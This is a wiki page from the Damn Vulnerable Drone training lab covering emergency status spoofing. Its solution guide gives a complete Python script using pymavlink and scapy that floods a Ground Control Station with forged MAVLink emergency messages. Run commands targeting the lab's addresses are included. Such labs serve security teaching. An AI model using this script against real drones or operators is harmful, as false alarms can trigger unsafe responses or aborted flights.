<i>Spoofing emergency status messages to mislead the Ground Control Station (GCS) about the drone's condition.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Protocol Tampering > Emergency Status Spoofing

# Description

Emergency status spoofing involves sending false emergency messages to the Ground Control Station (GCS) to mislead it about the drone's condition. This can cause the operator to believe the drone is experiencing critical issues, potentially leading to inappropriate responses or emergency protocols.

# Resources

- <a href="https://mavlink.io/en/">MAVLink Protocol</a>  
- <a href="https://mavlink.io/en/mavgen_python/">PyMAVLink Documentation</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Setup</h3>
<pre><code class="code mb-3 mt-3">sudo apt-get update
sudo apt-get install python3 python3-pip
pip3 install pymavlink scapy
</code></pre>

---

<h3>Step 2. Create the Script</h3>
<p>Save the following code as <code>emergency-status-spoofing.py</code>:</p>

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil
from scapy.all import *
import time
import sys
import random

def create_statustext(severity, text):
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.statustext_encode(
        severity=severity,
        text=text.encode('utf-8')
    ).pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python emergency-status-spoofing.py &lt;ip:port&gt;")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(':')
    target_port = int(target_port)

    messages = [
        (0, "EMERGENCY: Immediate action required"),
        (1, "ALERT: Attention needed"),
        (2, "CRITICAL: Engine failure"),
        (3, "ERROR: GPS signal lost"),
        (4, "WARNING: High temperature detected"),
        (5, "NOTICE: System check complete"),
        (6, "INFO: Battery at 50%"),
        (7, "DEBUG: Diagnostic mode enabled")
    ]

    while True:
        severity, message = random.choice(messages)
        packet = create_statustext(severity, message)
        send_mavlink_packet(packet, target_ip, target_port)
        print(f"Sent STATUSTEXT packet with severity {severity} and message '{message}' to {target_ip}:{target_port}")
        time.sleep(1)
</code></pre>

---

<h3>Step 3. Run the Script</h3>
<p>Execute the spoofing script with your target GCS IP and port:</p>

<pre><code class="code mb-3 mt-3">sudo python3 emergency-status-spoofing.py 10.13.0.6:14550</code></pre>

<p>Other valid GCS targets:</p>
<ul>
  <li><code>192.168.13.14:14550</code> – MAVProxy over WiFi</li>
  <li><code>10.13.0.4:14550</code> – MAVProxy over Docker bridge</li>
</ul>

---

<h3>Step 4. Monitor the Effects</h3>
<p>Watch the GCS interface for spoofed emergency messages like:</p>
<ul>
  <li><code>EMERGENCY: Immediate action required</code></li>
  <li><code>CRITICAL: Engine failure</code></li>
  <li><code>ERROR: GPS signal lost</code></li>
</ul>

<p>These may cause the operator to believe the drone is experiencing severe failures, triggering corrective actions or aborting missions.</p>

</details>
